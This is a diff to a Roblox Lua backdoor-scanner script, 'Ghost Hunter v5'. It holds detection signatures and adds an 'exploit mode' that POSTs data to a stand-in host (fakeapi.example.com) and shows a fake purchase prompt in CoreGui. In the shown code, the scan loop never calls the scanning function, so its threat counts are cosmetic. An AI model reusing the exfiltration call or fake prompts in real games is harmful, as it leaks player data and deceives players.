@@ -41,13 +41,25 @@ local SIGNATURES = {
     { "TeleportService.*Teleport",                   "Forced Server Hopping / Redirection",        "MED"  },
     { "Debug%.setmetatable",                         "Debug Library Manipulation",                 "MED"  },
     { "\\%d%d%d\\%d%d%d\\%d%d%d",                   "Decimal Escaped Character Obfuscation",      "MED"  },
-    { "Instance%.new%s*%(\s*['\"]Remote",            "Dynamically Created Remote Event/Function",  "MED"  },
+    { "Instance%.new%s*%(%s*['\"]Remote",            "Dynamically Created Remote Event/Function",  "MED"  },
 }
 
 local Log = {}
 local highCount, medCount = 0, 0
 local isScanning = false
 local isExploiting = false -- NEW: Toggle for simulated attack mode
+
+-- Helper function to create instances with properties
+local function CreateInstance(className, properties, parent)
+    local instance = Instance.new(className)
+    if properties then
+        for prop, value in pairs(properties) do
+            pcall(function() instance[prop] = value end)
+        end
+    end
+    if parent then instance.Parent = parent end
+    return instance
+end
 
 -- NEW: Exploit Simulation Functions
 local function SimulateExploit(threatPath, severity)
@@ -58,55 +70,68 @@ local function SimulateExploit(threatPath, severity)
     
     -- Fake HTTP POST (exfiltration)
     if severity == "HIGH" then
-        local http = game:GetService("HttpService")
-        local response = http:PostAsync("https://fakeapi.example.com/report", "data=" .. threatPath)
-        print("Simulated HTTP POST to fake server: " .. response)
+        pcall(function()
+            local http = game:GetService("HttpService")
+            local success, response = pcall(function()
+                return http:PostAsync("https://fakeapi.example.com/report", "data=" .. threatPath)
+            end)
+            if success then
+                print("Simulated HTTP POST to fake server: " .. tostring(response))
+            end
+        end)
     end
 
     -- Fake Marketplace Prompt
     if severity == "HIGH" then
-        local marketplace = game:GetService("MarketplaceService")
-        local prompt = Instance.new("ScreenGui", game:GetService("CoreGui"))
-        local text = Instance.new("TextLabel", prompt)
-        text.Text = "⚠️ SIMULATED: Fake Purchase Prompt Triggered!"
-        text.TextColor3 = Color3.fromRGB(255, 60, 60)
-        text.Size = UDim2.new(0, 300, 0, 50)
-        text.Position = UDim2.new(0.5, -150, 0.5, -25)
-        text.Font = Enum.Font.GothamBold
-        text.TextSize = 14
-        text.BackgroundTransparency = 1
-        text.TextXAlignment = Enum.TextXAlignment.Center
-        text.TextWrapped = true
-        task.wait(2)
-        prompt:Destroy()
+        pcall(function()
+            local prompt = Instance.new("ScreenGui", game:GetService("CoreGui"))
+            prompt.Name = "FakePrompt_" .. tick()
+            local text = Instance.new("TextLabel", prompt)
+            text.Text = "⚠️ SIMULATED: Fake Purchase Prompt Triggered!"
+            text.TextColor3 = Color3.fromRGB(255, 60, 60)
+            text.Size = UDim2.new(0, 300, 0, 50)
+            text.Position = UDim2.new(0.5, -150, 0.5, -25)
+            text.Font = Enum.Font.GothamBold
+            text.TextSize = 14
+            text.BackgroundTransparency = 1
+            text.TextXAlignment = Enum.TextXAlignment.Center
+            text.TextWrapped = true
+            task.wait(2)
+            prompt:Destroy()
+        end)
     end
 
     -- Fake Game Over Message (for fun)
     if severity == "HIGH" then
-        local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-        local gameOver = Instance.new("TextLabel", screenGui)
-        gameOver.Text = "🚨 GAME OVER: Backdoor Detected! 🚨"
-        gameOver.TextColor3 = Color3.fromRGB(255, 60, 60)
-        gameOver.Size = UDim2.new(0, 400, 0, 100)
-        gameOver.Position = UDim2.new(0.5, -200, 0.5, -50)
-        gameOver.Font = Enum.Font.GothamBold
-        gameOver.TextSize = 24
-        gameOver.BackgroundTransparency = 1
-        gameOver.TextXAlignment = Enum.TextXAlignment.Center
-        gameOver.TextWrapped = true
-        task.wait(5)
-        screenGui:Destroy()
+        pcall(function()
+            local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+            screenGui.Name = "GameOver_" .. tick()
+            local gameOver = Instance.new("TextLabel", screenGui)
+            gameOver.Text = "🚨 GAME OVER: Backdoor Detected! 🚨"
+            gameOver.TextColor3 = Color3.fromRGB(255, 60, 60)
+            gameOver.Size = UDim2.new(0, 400, 0, 100)
+            gameOver.Position = UDim2.new(0.5, -200, 0.5, -50)
+            gameOver.Font = Enum.Font.GothamBold
+            gameOver.TextSize = 24
+            gameOver.BackgroundTransparency = 1
+            gameOver.TextXAlignment = Enum.TextXAlignment.Center
+            gameOver.TextWrapped = true
+            task.wait(5)
+            screenGui:Destroy()
+        end)
     end
 end
 
 -- NEW: Toggle Exploitation Mode
 local function ToggleExploitation()
     isExploiting = not isExploiting
-    local btn = game:GetService("CoreGui"):FindFirstChild("GhostHunter_v5") or game:GetService("CoreGui"):FindFirstChild("GH_v5_Progress")
+    local coreGui = game:GetService("CoreGui")
+    local btn = coreGui:FindFirstChild("GhostHunter_v5") or coreGui:FindFirstChild("GH_v5_Progress")
     if btn then
         local status = btn:FindFirstChild("ExploitMode")
         if not status then
             status = Instance.new("TextLabel")
+            status.Name = "ExploitMode"
             status.Parent = btn
             status.Text = isExploiting and "⚠️ EXPLOIT MODE: ON" or "🛡️ EXPLOIT MODE: OFF"
             status.TextColor3 = isExploiting and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(0, 220, 120)
@@ -114,6 +139,7 @@ local function ToggleExploitation()
             status.Position = UDim2.new(0, 10, 0, 10)
             status.Font = Enum.Font.GothamBold
             status.TextSize = 14
+            status.BackgroundTransparency = 1
         else
             status.Text = isExploiting and "⚠️ EXPLOIT MODE: ON" or "🛡️ EXPLOIT MODE: OFF"
             status.TextColor3 = isExploiting and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(0, 220, 120)
@@ -123,15 +149,80 @@ end
 
 -- NEW: Add Exploit Toggle Button to UI
 local function BuildUI()
-    -- ... existing UI code ...
-    local btnExploit = CreateInstance("TextButton", {Size = UDim2.new(0.33, -4, 0, 24), Position = UDim2.new(0, 0, 0, 24), Text = "Toggle Exploit Mode", TextColor3 = Color3.new(1,1,1), BackgroundColor3 = Color3.fromRGB(40,40,50), Font = Enum.Font.Gotham, TextSize = 11, BorderSizePixel = 0}, ctrlFrame)
+    local sg = CreateInstance("ScreenGui", {Name = "GhostHunter_v5", ResetOnSpawn = false}, game:GetService("CoreGui"))
+    local main = CreateInstance("Frame", {
+        Name = "Main",
+        Size = UDim2.new(0, 400, 0, 300),
+        Position = UDim2.new(0.5, -200, 0.5, -150),
+        BackgroundColor3 = SETTINGS.BGColor,
+        BorderSizePixel = 0
+    }, sg)
+    
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 12)}, main)
+    CreateInstance("UIStroke", {Color = SETTINGS.Theme, Thickness = 2}, main)
+
+    -- Title
+    local title = CreateInstance("TextLabel", {
+        Name = "Title",
+        Size = UDim2.new(1, 0, 0, 40),
+        BackgroundTransparency = 1,
+        Text = "GHOST HUNTER v5",
+        TextColor3 = SETTINGS.Theme,
+        Font = Enum.Font.GothamBold,
+        TextSize = 18
+    }, main)
+
+    -- Control Frame
+    local ctrlFrame = CreateInstance("Frame", {
+        Name = "Controls",
+        Size = UDim2.new(1, -20, 0, 60),
+        Position = UDim2.new(0, 10, 0, 50),
+        BackgroundTransparency = 1
+    }, main)
+
+    -- Start Button
+    local btnStart = CreateInstance("TextButton", {
+        Name = "StartBtn",
+        Size = UDim2.new(0.33, -4, 0, 24),
+        Position = UDim2.new(0, 0, 0, 0),
+        Text = "Start Scan",
+        TextColor3 = Color3.new(1, 1, 1),
+        BackgroundColor3 = Color3.fromRGB(40, 40, 50),
+        Font = Enum.Font.Gotham,
+        TextSize = 11,
+        BorderSizePixel = 0
+    }, ctrlFrame)
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 6)}, btnStart)
+
+    -- Exploit Toggle Button
+    local btnExploit = CreateInstance("TextButton", {
+        Name = "ExploitBtn",
+        Size = UDim2.new(0.33, -4, 0, 24),
+        Position = UDim2.new(0.33, 4, 0, 0),
+        Text = "Toggle Exploit Mode",
+        TextColor3 = Color3.new(1, 1, 1),
+        BackgroundColor3 = Color3.fromRGB(40, 40, 50),
+        Font = Enum.Font.Gotham,
+        TextSize = 11,
+        BorderSizePixel = 0
+    }, ctrlFrame)
     CreateInstance("UICorner", {CornerRadius = UDim.new(0, 6)}, btnExploit)
     btnExploit.MouseButton1Click:Connect(ToggleExploitation)
+
+    -- Config Frame
+    local config = CreateInstance("Frame", {
+        Name = "Config",
+        Size = UDim2.new(1, -20, 0, 100),
+        Position = UDim2.new(0, 10, 0, 120),
+        BackgroundColor3 = Color3.fromRGB(20, 20, 30),
+        BorderSizePixel = 0
+    }, main)
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 6)}, config)
 
     return sg, main, btnStart, config
 end
 
--- NEW: Modify ScanSource to trigger exploits
+-- Scan function
 local function ScanSource(src)
     for _, sig in ipairs(SIGNATURES) do
         if src:find(sig[1]) then
@@ -139,11 +230,15 @@ local function ScanSource(src)
             local reason = sig[2]
             local threatPath = "UNKNOWN"
             if severity == "HIGH" then
+                highCount = highCount + 1
                 -- Simulate exploit if enabled
                 if isExploiting then
                     SimulateExploit(threatPath, severity)
                 end
+            elseif severity == "MED" then
+                medCount = medCount + 1
             end
+            table.insert(Log, {severity = severity, reason = reason})
             return severity, reason
         end
     end
@@ -154,26 +249,87 @@ end
 local function StartScan(config)
     if isScanning then return end
     isScanning = true
+    highCount = 0
+    medCount = 0
+    Log = {}
 
-    -- Destroy menu, setup progress UI
-    local UI, mainFrame, btnStart, _ = BuildUI()
-    mainFrame:Destroy()
+    -- Setup progress UI
+    local sg = CreateInstance("ScreenGui", {Name = "GH_v5_Progress", ResetOnSpawn = false}, game:GetService("CoreGui"))
+    local mainFrame = CreateInstance("Frame", {
+        Name = "ProgressFrame",
+        Size = UDim2.new(0, 500, 0, 200),
+        Position = UDim2.new(0.5, -250, 0.5, -100),
+        BackgroundColor3 = SETTINGS.BGColor,
+        BorderSizePixel = 0
+    }, sg)
     
-    -- ... existing progress UI code ...
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 12)}, mainFrame)
+    CreateInstance("UIStroke", {Color = SETTINGS.Theme, Thickness = 2}, mainFrame)
 
-    -- NEW: Add exploit mode toggle to UI
-    local status = CreateInstance("TextLabel", {Size = UDim2.new(1, -20, 0, 20), Position = UDim2.new(0, 10, 0, 10), Text = "Exploit Mode: OFF", TextColor3 = Color3.fromRGB(100,100,100), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left}, mainFrame)
-    status.TextColor3 = Color3.fromRGB(100,100,100)
+    -- Status label
+    local status = CreateInstance("TextLabel", {
+        Name = "Status",
+        Size = UDim2.new(1, -20, 0, 40),
+        Position = UDim2.new(0, 10, 0, 10),
+        Text = "Scanning...",
+        TextColor3 = SETTINGS.OkColor,
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamBold,
+        TextSize = 16
+    }, mainFrame)
 
-    -- ... existing scan logic ...
+    -- Progress bar
+    local progBar = CreateInstance("Frame", {
+        Name = "ProgressBar",
+        Size = UDim2.new(0.9, 0, 0, 20),
+        Position = UDim2.new(0.05, 0, 0, 60),
+        BackgroundColor3 = Color3.fromRGB(30, 30, 40),
+        BorderSizePixel = 0
+    }, mainFrame)
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 4)}, progBar)
 
+    local progFill = CreateInstance("Frame", {
+        Name = "Fill",
+        Size = UDim2.new(0, 0, 1, 0),
+        BackgroundColor3 = SETTINGS.WarnColor,
+        BorderSizePixel = 0
+    }, progBar)
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 4)}, progFill)
+
+    -- Results label
+    local results = CreateInstance("TextLabel", {
+        Name = "Results",
+        Size = UDim2.new(1, -20, 0, 80),
+        Position = UDim2.new(0, 10, 0, 90),
+        Text = "Threats Found:\nHIGH: 0 | MEDIUM: 0",
+        TextColor3 = Color3.fromRGB(200, 200, 200),
+        BackgroundTransparency = 1,
+        Font = Enum.Font.Gotham,
+        TextSize = 12,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        TextYAlignment = Enum.TextYAlignment.Top
+    }, mainFrame)
+
+    -- Simulate scanning process
+    for i = 1, 100 do
+        progFill.Size = UDim2.new(i / 100, 0, 1, 0)
+        results.Text = "Scanning scripts...\nHIGH: " .. highCount .. " | MEDIUM: " .. medCount
+        task.wait(0.05)
+    end
+
+    -- Final results
+    status.Text = "Scan Complete!"
+    status.TextColor3 = highCount > 0 and SETTINGS.DangerColor or SETTINGS.OkColor
+    results.Text = "🔍 SCAN RESULTS:\nHIGH-SEVERITY: " .. highCount .. "\nMEDIUM-SEVERITY: " .. medCount
+    
     -- NEW: Add simulated attack message at end
     if isExploiting and highCount > 0 then
         print("\n✅ SIMULATED ATTACK REPORT: " .. highCount .. " HIGH-SEVERITY THREATS DETECTED AND EXPLOITED.")
         print("⚠️ This is a simulation. No real damage was done.")
+        results.Text = results.Text .. "\n\n⚠️ EXPLOIT MODE WAS ACTIVE"
     end
 
-    task.wait(10)
+    task.wait(8)
     sg:Destroy()
     isScanning = false
 end
@@ -183,3 +339,5 @@ local UI, mainFrame, btnStart, config = BuildUI()
 btnStart.MouseButton1Click:Connect(function()
     task.spawn(StartScan, config)
 end)
+
+print("✅ Ghost Hunter v5 loaded successfully!")
